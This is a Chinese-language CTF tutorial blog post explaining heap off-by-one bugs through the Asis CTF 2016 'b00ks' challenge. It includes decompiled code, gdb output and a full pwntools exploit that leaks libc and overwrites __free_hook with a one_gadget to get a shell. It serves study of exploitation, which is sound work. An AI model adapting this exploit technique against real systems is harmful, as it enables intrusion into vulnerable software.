          <h1 id="pwn堆入门系列教程1"><a href="#pwn堆入门系列教程1" class="headerlink" title="pwn堆入门系列教程1"></a>pwn堆入门系列教程1</h1><p>因为自己学堆的时候，找不到一个系统的教程，我将会按照ctf-wiki的目录一步步学下去，尽量做到每天有更新，方便跟我一样刚入门堆的人学习，第一篇教程研究了4天吧，途中没人指导。。很尴尬，自己一个很容易的点研究了很久才懂，把踩过的坑也总结下，方便后人不再踩坑</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://xz.aliyun.com/t/5749" target="_blank" rel="noopener">具体搭建方法点我</a></p>
<h2 id="off-by-one原理（引用ctf-wiki"><a href="#off-by-one原理（引用ctf-wiki" class="headerlink" title="off by one原理（引用ctf-wiki)"></a>off by one原理（引用ctf-wiki)</h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p>
<p>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。<br>字符串操作不合适<br>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。 此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss 段等等，但是堆上（heap based） 的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。</p>
<h2 id="off-by-one-利用思路（引用ctf-wiki"><a href="#off-by-one-利用思路（引用ctf-wiki" class="headerlink" title="off-by-one 利用思路（引用ctf-wiki)"></a>off-by-one 利用思路（引用ctf-wiki)</h2><p>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法<br>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</p>
<h2 id="off-by-one-自己理解"><a href="#off-by-one-自己理解" class="headerlink" title="off by one 自己理解"></a>off by one 自己理解</h2><p>其实就是程序员不小心，我们自己刚写代码的时候也是那样，经常会搞错，比如如下c代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">5</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    str[<span class="number">5</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码相信类似的，我们都写过，我们数组最高是<br>数组总长为5，数组下标从0开始，最大为4，而我们错误地使用了str[5],造成越界写了一个字节，这就是off-by-one，可这个开始我也没懂这个的强大，直到做了一道题目</p>
<h3 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 b00ks</h3><p>ctf-wiki上用了两种方法解这道题，我也就照着他的exp，一步步调试，没注释就慢慢理解，搞定了，他有纯利用off-by-one的，也有同时利用unlink跟off-by-one的，下面对这两种方法进行解释</p>
<p>先指出ida解析错误部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">    *(v3 + <span class="number">6</span>) = v1;</span><br><span class="line">    *(off_202010 + v2) = v3;</span><br><span class="line">    *(v3 + <span class="number">2</span>) = v5;</span><br><span class="line">    *(v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">    *v3 = ++unk_202024;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个v3加6是错误的偏移，应该是v3+3，具体看汇编代码就可以了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">text:<span class="number">0000000000001122</span> ; <span class="number">48</span>:                   *(v3 + <span class="number">6</span>) = v1;</span><br><span class="line">.text:<span class="number">0000000000001122</span></span><br><span class="line">.text:<span class="number">0000000000001122</span> loc_1122:                               ; CODE XREF: Create+<span class="number">1B</span>8↑j</span><br><span class="line">.text:<span class="number">0000000000001122</span>                 mov     eax, [rbp+var_20]</span><br><span class="line">.text:<span class="number">0000000000001125</span>                 mov     edx, eax</span><br><span class="line">.text:<span class="number">0000000000001127</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000112B</span>                 mov     [rax+<span class="number">18</span>h], edx</span><br><span class="line">.text:<span class="number">000000000000112</span>E ; <span class="number">49</span>:                   *(off_202010 + v2) = v3;</span><br><span class="line">.text:<span class="number">000000000000112</span>E                 lea     rax, off_202010</span><br><span class="line">.text:<span class="number">0000000000001135</span>                 mov     rax, [rax]</span><br><span class="line">.text:<span class="number">0000000000001138</span>                 mov     edx, [rbp+var_1C]</span><br><span class="line">.text:<span class="number">000000000000113B</span>                 movsxd  rdx, edx</span><br><span class="line">.text:<span class="number">000000000000113</span>E                 shl     rdx, <span class="number">3</span></span><br><span class="line">.text:<span class="number">0000000000001142</span>                 add     rdx, rax</span><br><span class="line">.text:<span class="number">0000000000001145</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001149</span>                 mov     [rdx], rax</span><br><span class="line">.text:<span class="number">000000000000114</span>C ; <span class="number">50</span>:                   *(v3 + <span class="number">2</span>) = v5;</span><br><span class="line">.text:<span class="number">000000000000114</span>C                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001150</span>                 mov     rdx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">0000000000001154</span>                 mov     [rax+<span class="number">10</span>h], rdx</span><br><span class="line">.text:<span class="number">0000000000001158</span> ; <span class="number">51</span>:                   *(v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">.text:<span class="number">0000000000001158</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">000000000000115</span>C                 mov     rdx, [rbp+ptr]</span><br><span class="line">.text:<span class="number">0000000000001160</span>                 mov     [rax+<span class="number">8</span>], rdx</span><br><span class="line">.text:<span class="number">0000000000001164</span> ; <span class="number">52</span>:                   *v3 = ++unk_202024;</span><br><span class="line">.text:<span class="number">0000000000001164</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">000000000000116B</span>                 mov     eax, [rax]</span><br><span class="line">.text:<span class="number">000000000000116</span>D                 lea     edx, [rax+<span class="number">1</span>]</span><br><span class="line">.text:<span class="number">0000000000001170</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">0000000000001177</span>                 mov     [rax], edx</span><br><span class="line">.text:<span class="number">0000000000001179</span>                 lea     rax, unk_202024</span><br><span class="line">.text:<span class="number">0000000000001180</span>                 mov     edx, [rax]</span><br><span class="line">.text:<span class="number">0000000000001182</span>                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:<span class="number">0000000000001186</span>                 mov     [rax], edx</span><br><span class="line">.text:<span class="number">0000000000001188</span>                 mov     eax, <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>看每段的mov语句，</p>
<ul>
<li>第一段是mov [rax+18h],edx对应v3+6?</li>
<li>第二段不看，加了变量</li>
<li>第三段是mov [rax+10h],rdx对应v3+2？</li>
</ul>
<h4 id="off-by-one-攻击过程"><a href="#off-by-one-攻击过程" class="headerlink" title="off-by-one 攻击过程"></a>off-by-one 攻击过程</h4><p>出现这个漏洞的函数在这</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>; <span class="comment">//危险部分</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他由于没考虑好边界条件，多写了一个0到末尾<br>书本结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h4><p>我先说明下攻击过程，下面的讲解会围绕这个攻击过程来</p>
<ol>
<li>填充满author</li>
<li>创建堆块1，覆盖author结尾的\x00,这样我们输出的时候就可以泄露堆块1的地址</li>
<li>创建堆块2，为后续做准备，堆块2要申请得比较大，因为mmap申请出来的堆块地址与libc有固定的偏移</li>
<li>泄露堆块1地址，记为first_heap</li>
<li><strong>(关键点来了)</strong> 这时候的攻击思路是利用编辑author的时候多写了一个\x00字节，可以覆盖到堆块1的地址的最后一位，如果我们提前将堆块1的内容编辑好，按照上述的结构体布置好，name和description我们自己控制，伪造成一个书本的结构体，然后让覆盖过后的地址刚好是book1的description部分的话，我们相当于获得了一个任意地址读写的能力啊</li>
<li>后面就简单了，任意读取获得libc地址</li>
<li>任意写将__free_hook函数的地址改写成one_gadget地址</li>
</ol>
<p>tips:__free_hook若没有则不调用，若有将先于free函数调用</p>
<h5 id="先贴上exp，没有代码，没有调试就没有灵魂"><a href="#先贴上exp，没有代码，没有调试就没有灵魂" class="headerlink" title="先贴上exp，没有代码，没有调试就没有灵魂"></a>先贴上exp，没有代码，没有调试就没有灵魂</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">'b00ks'</span>)</span><br><span class="line"></span><br><span class="line">LIBC = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">'127.0.0.1'</span></span><br><span class="line">port = int(args.PORT <span class="keyword">or</span> <span class="number">1080</span>)</span><br><span class="line">ctx.binary = <span class="string">'b00ks'</span></span><br><span class="line">ctx.remote_libc = LIBC</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    io.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(book_size, book_name, desc_size, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(book_size))</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">if</span> len(book_name) == book_size:<span class="comment">#deal with overflow</span></span><br><span class="line">        io.send(book_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(book_name)</span><br><span class="line">    io.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(desc_size))</span><br><span class="line">    <span class="keyword">if</span> len(desc) == desc_size:</span><br><span class="line">        io.send(desc)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(desc))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printbook</span><span class="params">(id)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(id):</span><br><span class="line">        book_id = int(io.readline()[:<span class="number">-1</span>])</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_name = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_des = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_author = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, str(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    create(<span class="number">48</span>, <span class="string">'1a'</span>, <span class="number">240</span>, <span class="string">'1b'</span>) <span class="comment">#1</span></span><br><span class="line">    create(<span class="number">0x21000</span>, <span class="string">'2a'</span>, <span class="number">0x21000</span>, <span class="string">'2b'</span>)<span class="comment">#2</span></span><br><span class="line">    book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">    first_heap = u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    payload =  <span class="string">'a'</span>*<span class="number">0xa0</span> + p64(<span class="number">1</span>) + p64(first_heap + <span class="number">0x38</span>) + p64(first_heap + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    author_name(<span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br><span class="line">    book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">    book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    book2_des_addr = u64(book_des.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"book2 name addr: 0x%x"</span> % book2_name_addr)</span><br><span class="line">    io.success(<span class="string">"book2 des addr: 0x%x"</span> % book2_des_addr)</span><br><span class="line">    libc_base = book2_des_addr - <span class="number">0x5a8010</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    offset = <span class="number">0x45216</span> </span><br><span class="line">    offset = <span class="number">0x4526a</span> </span><br><span class="line">    <span class="comment">#offset = 0xf02a4 </span></span><br><span class="line">    <span class="comment">#offset = 0xf1147</span></span><br><span class="line">    one_gadget = libc_base + offset</span><br><span class="line">    io.success(<span class="string">"free_hook addr: 0x%x"</span> % free_hook)</span><br><span class="line">    io.success(<span class="string">"one_gadget addr: 0x%x"</span> % one_gadget)</span><br><span class="line">    payload = p64(free_hook)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    edit(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<p>我只讲解exp函数内的内容，外面的那些只是为了方便堆块的申请，输出，删除什么的，堆题建议都写成函数，因为将会有大量重复动作</p>
<h5 id="填满author"><a href="#填满author" class="headerlink" title="填满author"></a>填满author</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">": "</span>, <span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br></pre></td></tr></table></figure>
<p>具体查找author位置可以跟我一样，find 字符串</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find author</span><br><span class="line">Searching for 'author' in: None ranges</span><br><span class="line">Found <span class="number">8</span> results, display max <span class="number">8</span> items:</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd83e1</span> (<span class="string">"author name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd8401</span> (<span class="string">"author name: "</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bcd841c</span> (<span class="string">"author_name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed83e1</span> (<span class="string">"author name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed8401</span> (<span class="string">"author name: "</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed841c</span> (<span class="string">"author_name"</span>)</span><br><span class="line">b00ks_debug : <span class="number">0x555b3bed905a</span> --&gt; <span class="number">0xa160726f68747561</span> </span><br><span class="line">    [<span class="built_in">stack</span>] : <span class="number">0x7ffed60b6406</span> (<span class="string">"author name: "</span>)</span><br></pre></td></tr></table></figure>

<p>这是创建一个堆块过后的效果，第三行便是book1结构体地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x555b3bed905a</span><span class="number">-0x2</span><span class="number">-0x18</span></span><br><span class="line"><span class="number">0x555b3bed9040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555b3bed9050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x726f687475616161</span></span><br><span class="line"><span class="number">0x555b3bed9060</span>:	<span class="number">0x0000555b3bf8a160</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed9090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555b3bed90d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<h5 id="创建堆块1"><a href="#创建堆块1" class="headerlink" title="创建堆块1"></a>创建堆块1</h5><p>相信我，这里是这道题最难的地方，过了这个坎就很简单了，每个人环境不同，处理的结果也不一样，所以自行调试，在这里我能给你的建议就是将description申请大一点，泄露部分不需要这里大小控制，先不讲，你先调试到能泄露就行</p>
<h5 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h5><p>这个不多讲</p>
<h5 id="通过edit伪造book结构体"><a href="#通过edit伪造book结构体" class="headerlink" title="通过edit伪造book结构体"></a>通过edit伪造book结构体</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload =  <span class="string">'a'</span>*<span class="number">0xa0</span> + p64(<span class="number">1</span>) + p64(first_heap + <span class="number">0x38</span>) + p64(first_heap + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br></pre></td></tr></table></figure>
<p>这前面的偏移是看个人环境的，网上的很多没有偏移，在我电脑环境上做不到，我通过这个偏移能刚好对齐，具体调试过程就是繁杂的了，总之，你要让你覆盖掉堆块1的地址那部分，刚好在book1的description指针指向的空间里，这样你才能自行伪造结构体<br>比如<br>我泄露出来的第一个堆块地址为这个[+] first_heap: 0x55b6b5d72160<br>那这时候我覆盖过后地址就变成[+] first_heap: 0x55b6b5d72100，你要让0x55b6b5d72100在description指向的空间内就成了，建议将description申请的大一些，这样容易做到，这部分跟创建堆块1是结合起来的，你看我创建的大小在你那不一定准确</p>
<h5 id="这时候再次利用off-by-one"><a href="#这时候再次利用off-by-one" class="headerlink" title="这时候再次利用off by one"></a>这时候再次利用off by one</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">author_name(<span class="string">"author"</span>.rjust(<span class="number">0x20</span>,<span class="string">'a'</span>))</span><br></pre></td></tr></table></figure>
<p>将地址最低位覆盖成\x00,这样我们我们的那个堆块1的指针就指向了我们自己伪造的结构体了，这个结构体description和name我们指向了book2结构体，这样我们通过编辑堆块1的description就能改掉book2的结构体的description指针和name指针，我们能编辑book2的description，相当于任意写了</p>
